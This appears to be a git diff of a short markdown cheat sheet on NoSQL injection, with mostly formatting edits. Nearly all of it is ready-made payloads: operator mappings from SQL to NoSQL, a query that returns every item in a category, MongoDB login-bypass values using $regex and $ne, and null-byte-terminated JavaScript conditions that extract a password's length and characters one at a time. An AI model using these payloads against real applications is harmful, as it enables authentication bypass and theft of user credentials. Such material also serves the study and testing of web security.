@@ -1,4 +1,4 @@
-# Boolean operator difference between SQLi && NoSQLi
+# Basic operator difference between SQLi && NoSQLi
   1. ```or``` >> ```||```
   2. ```and``` >> ```&&```
   3. ```-- -``` >> ```%00``` 
@@ -24,15 +24,15 @@ You can also remove the ```x``` end of the payload.
   3. ```category=Gifts' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.
 
 # MongoDB Login Bypass
-
+```
 {"$regex":""} >> For username
 {"$ne":"Invalid"} >> For password
-
-#MongoDB Data Retrieving
-
+```
+# MongoDB Data Retrieving
+```
 ' && this.password.length < 50%00 >> For extracting password length in URL
 ' && this.password[0] == 'a'%00 >> For extracting password in URL
-
+```
 #Operator Injection To Retrieving Unknown Data
 
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
